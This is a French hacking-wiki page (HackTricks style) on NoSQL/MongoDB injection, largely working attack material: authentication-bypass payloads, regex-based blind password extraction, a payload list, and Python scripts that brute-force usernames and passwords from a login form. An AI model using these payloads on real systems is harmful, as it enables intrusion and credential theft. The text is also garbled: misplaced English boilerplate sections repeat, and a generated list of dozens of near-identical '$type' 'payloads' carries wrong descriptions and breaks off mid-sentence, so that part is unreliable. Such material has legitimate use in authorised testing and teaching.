# Injection NoSQL

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Les bases de donn√©es NoSQL offrent des restrictions de coh√©rence moins strictes que les bases de donn√©es SQL traditionnelles. En n√©cessitant moins de contraintes relationnelles et de v√©rifications de coh√©rence, les bases de donn√©es NoSQL offrent souvent des avantages en termes de performances et de mise √† l'√©chelle. Cependant, ces bases de donn√©es sont toujours potentiellement vuln√©rables aux attaques par injection, m√™me si elles n'utilisent pas la syntaxe SQL traditionnelle.

## Exploitation

En PHP, vous pouvez envoyer un tableau en modifiant le param√®tre envoy√© de _parameter=foo_ √† _parameter\[arrName]=foo._

Les exploits sont bas√©s sur l'ajout d'un **op√©rateur** :
```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```
### Contournement de l'authentification de base

**Utilisation de la n√©gation ($ne) ou de la sup√©riorit√© ($gt)**
```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```
### **SQL - Mongo**

---

#### **NoSQL Injection**

---

NoSQL databases, such as MongoDB, are becoming increasingly popular due to their flexibility and scalability. However, just like SQL databases, NoSQL databases are also vulnerable to injection attacks.

NoSQL injection occurs when an attacker is able to manipulate a NoSQL query in order to retrieve unauthorized data or perform unauthorized actions. This can happen when user input is not properly sanitized or validated before being used in a query.

#### **Types of NoSQL Injection**

---

There are several types of NoSQL injection attacks that can be performed against a MongoDB database:

1. **Query Manipulation**: In this type of attack, the attacker manipulates the query parameters to modify the behavior of the query. For example, the attacker may be able to bypass authentication by modifying the query to always return true.

2. **Command Injection**: In command injection attacks, the attacker is able to inject additional commands into the query. This can allow the attacker to execute arbitrary commands on the database server.

3. **JavaScript Injection**: MongoDB allows the use of JavaScript in queries. An attacker can exploit this feature by injecting malicious JavaScript code into the query, which can lead to unauthorized data retrieval or code execution.

#### **Preventing NoSQL Injection**

---

To prevent NoSQL injection attacks, it is important to follow secure coding practices:

1. **Input Validation**: Always validate and sanitize user input before using it in a query. This includes checking for special characters and ensuring that the input is of the expected type.

2. **Parameterized Queries**: Use parameterized queries or prepared statements to ensure that user input is properly escaped and treated as data, rather than executable code.

3. **Least Privilege**: Ensure that the database user account used by the application has the least privilege necessary to perform its intended functions. This can help limit the potential impact of an injection attack.

4. **Secure Configuration**: Follow secure configuration practices for your NoSQL database, such as disabling unnecessary features and enabling authentication and access controls.

By following these best practices, you can significantly reduce the risk of NoSQL injection attacks and protect your MongoDB database from unauthorized access or manipulation.
```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```
### Extraire les informations de **longueur**

L'injection NoSQL peut √™tre utilis√©e pour extraire des informations sur la longueur des donn√©es stock√©es dans une base de donn√©es NoSQL. Cela peut √™tre utile lors de l'exploration d'une application Web pour identifier les vuln√©rabilit√©s potentielles.

Pour extraire les informations de longueur, vous pouvez utiliser l'op√©rateur `$regex` avec une expression r√©guli√®re qui correspond √† la longueur souhait√©e. Par exemple, pour extraire les informations sur la longueur d'une cha√Æne de caract√®res, vous pouvez utiliser l'expression r√©guli√®re `^.{n}$`, o√π `n` est la longueur souhait√©e.

Voici un exemple de requ√™te d'injection NoSQL pour extraire les informations de longueur d'une cha√Æne de caract√®res :

```plaintext
GET /api/users?username[$regex]=^.{10}$
```

Dans cet exemple, nous utilisons l'op√©rateur `$regex` pour rechercher les utilisateurs dont le nom d'utilisateur a une longueur de 10 caract√®res. Si la requ√™te renvoie une r√©ponse r√©ussie, cela signifie que la longueur du nom d'utilisateur est de 10 caract√®res.

Il est important de noter que l'injection NoSQL peut √™tre complexe et n√©cessite une compr√©hension approfondie de la structure de la base de donn√©es cible. Il est recommand√© de proc√©der avec prudence et de ne l'utiliser que dans le cadre d'un test d'intrusion l√©gitime et autoris√©.
```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```
### Extraire les informations **data**
```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
### **SQL - Mongo**

---

#### **NoSQL Injection**

---

NoSQL databases, such as MongoDB, are becoming increasingly popular due to their flexibility and scalability. However, just like SQL databases, NoSQL databases are also vulnerable to injection attacks.

NoSQL injection occurs when an attacker is able to manipulate a NoSQL query in order to retrieve unauthorized data or perform unauthorized actions. This can happen when user input is not properly sanitized or validated before being used in a query.

#### **Types of NoSQL Injection**

---

There are several types of NoSQL injection attacks that can be performed against a MongoDB database:

1. **Boolean-based injection**: This type of injection relies on the ability to manipulate the query in order to force a true or false condition. By exploiting this vulnerability, an attacker can retrieve sensitive information or perform unauthorized actions.

2. **Time-based injection**: In a time-based injection attack, an attacker is able to delay the response from the database in order to extract information. By carefully crafting the query, an attacker can determine if a condition is true or false based on the response time.

3. **Union-based injection**: Union-based injection involves injecting a query that combines the results of two or more queries into a single result set. This can be used to retrieve data from multiple collections or perform unauthorized actions.

#### **Preventing NoSQL Injection**

---

To prevent NoSQL injection attacks, it is important to follow secure coding practices:

1. **Input validation**: Always validate and sanitize user input before using it in a query. This includes checking for special characters and ensuring that the input matches the expected data type.

2. **Parameterized queries**: Use parameterized queries or prepared statements to separate the query logic from the user input. This helps prevent injection attacks by ensuring that user input is treated as data and not as part of the query.

3. **Least privilege principle**: Ensure that the database user account used by the application has the least privileges necessary to perform its intended functions. This helps limit the potential impact of an injection attack.

By following these best practices, you can significantly reduce the risk of NoSQL injection attacks and protect your MongoDB database from unauthorized access or manipulation.
```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```
### Ex√©cution arbitraire de fonction PHP

En utilisant l'op√©rateur **$func** de la biblioth√®que [MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) (utilis√©e par d√©faut), il est possible d'ex√©cuter une fonction arbitraire comme dans [ce rapport](https://swarm.ptsecurity.com/rce-cockpit-cms/).
```python
"user":{"$func": "var_dump"}
```
![](<../.gitbook/assets/image (468).png>)

### Obtenir des informations √† partir de diff√©rentes collections

Il est possible d'utiliser [**$lookup**](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) pour obtenir des informations √† partir d'une collection diff√©rente. Dans l'exemple suivant, nous lisons √† partir d'une **collection diff√©rente** appel√©e **`users`** et obtenons les **r√©sultats de toutes les entr√©es** avec un mot de passe correspondant √† un caract√®re g√©n√©rique.
```json
[
{
"$lookup":{
"from": "users",
"as":"resultado","pipeline": [
{
"$match":{
"password":{
"$regex":"^.*"
}
}
}
]
}
}
]
```
<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Blind NoSQL
```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
print("[i] Looking for char number "+str(i+1))
for char in alphabet:
r = requests.get("http://chall.com?param=^"+flag+char)
if ("<TRUE>" in r.text):
flag += char
print("[+] Flag: "+flag)
break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
for c in string.printable:
if c not in ['*','+','.','?','|']:
payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
r = requests.post(u, data = {'ids': payload}, verify = False)
if 'OK' in r.text:
print("Found one more char : %s" % (password+c))
password += c
```
## Charges MongoDB

Les injections NoSQL peuvent √©galement √™tre utilis√©es pour attaquer les bases de donn√©es MongoDB. Voici quelques exemples de charges utiles pour les injections NoSQL dans MongoDB :

### 1. Injection de comparaison

```javascript
{ $ne: null }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© n'est pas √©gal √† `null`.

### 2. Injection de comparaison avec une valeur

```javascript
{ $gt: "" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est sup√©rieur √† une cha√Æne vide.

### 3. Injection de comparaison avec une expression r√©guli√®re

```javascript
{ $regex: /./ }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© correspond √† n'importe quelle valeur.

### 4. Injection de comparaison avec une valeur sp√©cifique

```javascript
{ $where: "this.field == 'valeur'" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est √©gal √† une valeur sp√©cifique.

### 5. Injection de comparaison avec une valeur de type diff√©rent

```javascript
{ $type: 10 }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type diff√©rent de celui sp√©cifi√©.

### 6. Injection de comparaison avec une valeur de type sp√©cifique

```javascript
{ $type: "string" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type sp√©cifique.

### 7. Injection de comparaison avec une valeur de type inconnu

```javascript
{ $type: "undefined" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type inconnu.

### 8. Injection de comparaison avec une valeur de type null

```javascript
{ $type: "null" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type `null`.

### 9. Injection de comparaison avec une valeur de type bool√©en

```javascript
{ $type: "boolean" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type bool√©en.

### 10. Injection de comparaison avec une valeur de type tableau

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau.

### 11. Injection de comparaison avec une valeur de type objet

```javascript
{ $type: "object" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type objet.

### 12. Injection de comparaison avec une valeur de type nombre

```javascript
{ $type: "number" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type nombre.

### 13. Injection de comparaison avec une valeur de type cha√Æne de caract√®res

```javascript
{ $type: "string" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type cha√Æne de caract√®res.

### 14. Injection de comparaison avec une valeur de type date

```javascript
{ $type: "date" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type date.

### 15. Injection de comparaison avec une valeur de type binaire

```javascript
{ $type: "binary" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type binaire.

### 16. Injection de comparaison avec une valeur de type code

```javascript
{ $type: "code" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type code.

### 17. Injection de comparaison avec une valeur de type r√©f√©rence

```javascript
{ $type: "dbref" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type r√©f√©rence.

### 18. Injection de comparaison avec une valeur de type symbole

```javascript
{ $type: "symbol" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type symbole.

### 19. Injection de comparaison avec une valeur de type code JavaScript

```javascript
{ $type: "javascript" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type code JavaScript.

### 20. Injection de comparaison avec une valeur de type code avec port√©e

```javascript
{ $type: "javascriptWithScope" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type code avec port√©e.

### 21. Injection de comparaison avec une valeur de type entier 32 bits

```javascript
{ $type: "int" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type entier 32 bits.

### 22. Injection de comparaison avec une valeur de type horodatage

```javascript
{ $type: "timestamp" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type horodatage.

### 23. Injection de comparaison avec une valeur de type entier 64 bits

```javascript
{ $type: "long" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type entier 64 bits.

### 24. Injection de comparaison avec une valeur de type d√©cimal

```javascript
{ $type: "decimal" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type d√©cimal.

### 25. Injection de comparaison avec une valeur de type minKey

```javascript
{ $type: "minKey" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type minKey.

### 26. Injection de comparaison avec une valeur de type maxKey

```javascript
{ $type: "maxKey" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type maxKey.

### 27. Injection de comparaison avec une valeur de type tableau de codes

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de codes.

### 28. Injection de comparaison avec une valeur de type tableau de cha√Ænes de caract√®res

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de cha√Ænes de caract√®res.

### 29. Injection de comparaison avec une valeur de type tableau d'objets

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau d'objets.

### 30. Injection de comparaison avec une valeur de type tableau de nombres

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de nombres.

### 31. Injection de comparaison avec une valeur de type tableau de bool√©ens

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de bool√©ens.

### 32. Injection de comparaison avec une valeur de type tableau de dates

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de dates.

### 33. Injection de comparaison avec une valeur de type tableau de binaires

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de binaires.

### 34. Injection de comparaison avec une valeur de type tableau de codes JavaScript

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de codes JavaScript.

### 35. Injection de comparaison avec une valeur de type tableau de codes avec port√©e

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de codes avec port√©e.

### 36. Injection de comparaison avec une valeur de type tableau d'entiers 32 bits

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau d'entiers 32 bits.

### 37. Injection de comparaison avec une valeur de type tableau d'horodatages

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau d'horodatages.

### 38. Injection de comparaison avec une valeur de type tableau d'entiers 64 bits

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau d'entiers 64 bits.

### 39. Injection de comparaison avec une valeur de type tableau de d√©cimaux

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de d√©cimaux.

### 40. Injection de comparaison avec une valeur de type tableau de minKeys

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de minKeys.

### 41. Injection de comparaison avec une valeur de type tableau de maxKeys

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de maxKeys.

### 42. Injection de comparaison avec une valeur de type tableau de tableaux de codes

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de codes.

### 43. Injection de comparaison avec une valeur de type tableau de tableaux de cha√Ænes de caract√®res

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de cha√Ænes de caract√®res.

### 44. Injection de comparaison avec une valeur de type tableau de tableaux d'objets

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux d'objets.

### 45. Injection de comparaison avec une valeur de type tableau de tableaux de nombres

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de nombres.

### 46. Injection de comparaison avec une valeur de type tableau de tableaux de bool√©ens

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de bool√©ens.

### 47. Injection de comparaison avec une valeur de type tableau de tableaux de dates

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de dates.

### 48. Injection de comparaison avec une valeur de type tableau de tableaux de binaires

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de binaires.

### 49. Injection de comparaison avec une valeur de type tableau de tableaux de codes JavaScript

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de codes JavaScript.

### 50. Injection de comparaison avec une valeur de type tableau de tableaux de codes avec port√©e

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de codes avec port√©e.

### 51. Injection de comparaison avec une valeur de type tableau de tableaux d'entiers 32 bits

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux d'entiers 32 bits.

### 52. Injection de comparaison avec une valeur de type tableau de tableaux d'horodatages

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux d'horodatages.

### 53. Injection de comparaison avec une valeur de type tableau de tableaux d'entiers 64 bits

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux d'entiers 64 bits.

### 54. Injection de comparaison avec une valeur de type tableau de tableaux de d√©cimaux

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de d√©cimaux.

### 55. Injection de comparaison avec une valeur de type tableau de tableaux de minKeys

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de minKeys.

### 56. Injection de comparaison avec une valeur de type tableau de tableaux de maxKeys

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de maxKeys.

### 57. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux de codes

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux de codes.

### 58. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux de cha√Ænes de caract√®res

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux de cha√Ænes de caract√®res.

### 59. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux d'objets

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux d'objets.

### 60. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux de nombres

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux de nombres.

### 61. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux de bool√©ens

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux de bool√©ens.

### 62. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux de dates

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux de dates.

### 63. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux de binaires

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux de binaires.

### 64. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux de codes JavaScript

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux de codes JavaScript.

### 65. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux de codes avec port√©e

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux de codes avec port√©e.

### 66. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux d'entiers 32 bits

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux d'entiers 32 bits.

### 67. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux d'horodatages

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux d'horodatages.

### 68. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux d'entiers 64 bits

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les documents o√π le champ sp√©cifi√© est de type tableau de tableaux de tableaux d'entiers 64 bits.

### 69. Injection de comparaison avec une valeur de type tableau de tableaux de tableaux de d√©cimaux

```javascript
{ $type: "array" }
```

Cette charge utile renvoie tous les
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```
## Outils

* [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
* [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)

### Force brute des noms d'utilisateur et des mots de passe √† partir de la connexion POST

Il s'agit d'un script simple que vous pouvez modifier, mais les outils pr√©c√©dents peuvent √©galement effectuer cette t√¢che.
```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
print("Extracting password of "+username)
params = {"username":username, "password[$regex]":"", "login": "login"}
password = "^"
while True:
for c in possible_chars:
params["password[$regex]"] = password + c + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
password += c
break
if c == possible_chars[-1]:
print("Found password "+password[1:].replace("\\", "")+" for username "+username)
return password[1:].replace("\\", "")

def get_usernames():
usernames = []
params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
for c in possible_chars:
username = "^" + c
params["username[$regex]"] = username + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
print("Found username starting with "+c)
while True:
for c2 in possible_chars:
params["username[$regex]"] = username + c2 + ".*"
if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
username += c2
print(username)
break

if c2 == possible_chars[-1]:
print("Found username: "+username[1:])
usernames.append(username[1:])
break
return usernames


for u in get_usernames():
get_password(u)
```
## R√©f√©rences

* [https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

